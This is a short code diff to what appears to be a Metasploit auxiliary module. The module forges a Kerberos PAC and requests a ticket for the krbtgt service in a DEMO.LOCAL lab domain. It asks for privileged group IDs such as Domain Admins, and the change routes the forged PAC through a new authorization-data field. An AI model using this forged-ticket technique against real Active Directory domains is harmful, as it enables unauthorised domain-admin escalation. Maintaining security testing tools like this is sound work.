@@ -72,6 +72,8 @@ class Metasploit4 < Msf::Auxiliary
       logon_time: logon_time,
     )
 
+    auth_data = build_authorization_data(pac: pac.encode)
+
     res = send_request_tgs(
       client_name: 'juan',
       server_name: 'krbtgt/DEMO.LOCAL',
@@ -82,7 +84,7 @@ class Metasploit4 < Msf::Auxiliary
       ticket: ticket,
       group_ids: [513, 512, 520, 518, 519],
       domain_id: 'S-1-5-21-1755879683-3641577184-3486455962',
-      pac: pac.encode
+      auth_data: auth_data
     )
 
     unless res.msg_type == 13
